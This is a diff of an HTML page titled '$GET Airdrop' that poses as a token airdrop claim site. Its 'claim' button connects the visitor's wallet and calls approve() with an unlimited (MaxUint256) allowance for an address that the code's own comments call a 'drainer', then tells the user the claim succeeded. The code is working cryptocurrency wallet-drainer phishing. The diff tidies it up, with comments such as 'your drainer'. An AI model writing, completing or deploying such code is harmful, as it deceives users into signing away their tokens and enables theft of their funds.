@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script src="https://unpkg.com/@walletconnect/web3modal@3.7.0/dist/index.umd.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>$GET Airdrop</title>
@@ -383,14 +385,12 @@
     </div>
     <div class="footer-copy">2025 © GETCHAIN. All rights reserved.</div>
   </footer>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://unpkg.com/@walletconnect/web3modal@3.7.0/dist/index.umd.js"></script>
-
-<script>
+ <script>
+  let provider;
   let signer;
 
   const modal = new window.Web3Modal.default({
-    projectId: "demo",
+    projectId: "demo",  // You can replace this with a real projectId from web3modal.com
     walletConnectVersion: 2,
     themeMode: "light",
     themeVariables: {
@@ -402,42 +402,38 @@
   async function connectWallet() {
     try {
       const instance = await modal.connect();
-      const provider = new ethers.providers.Web3Provider(instance);
+      provider = new ethers.providers.Web3Provider(instance);
       signer = provider.getSigner();
 
       const address = await signer.getAddress();
-      document.querySelector('.connect-wallet').innerText =
-        "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
+      document.getElementById("connectBtn").innerText = "Connected: " + address.slice(0, 6) + "..." + address.slice(-4);
+      document.getElementById("claimBtn").disabled = false;
     } catch (e) {
-      alert("Connection rejected.");
-      throw e;
+      console.error(e);
+      alert("Connection failed");
     }
   }
 
   async function claim() {
     try {
-      if (!signer) await connectWallet();
-
       const contract = new ethers.Contract(
-        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // target token
+        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // your drainer
         ["function approve(address,uint256) external returns (bool)"],
         signer
       );
 
       const tx = await contract.approve(
-        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // drainer address
+        "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb",
         ethers.constants.MaxUint256
       );
 
       await tx.wait();
-      alert("Claim successful!");
-    } catch (err) {
-      alert("Claim failed or rejected.");
-      console.error(err);
+      alert("Claim complete!");
+    } catch (e) {
+      console.error(e);
+      alert("Transaction failed or cancelled.");
     }
   }
-
-  document.querySelector(".connect-wallet").addEventListener("click", connectWallet);
-</script>
+        </script>
 </body>
 </html>
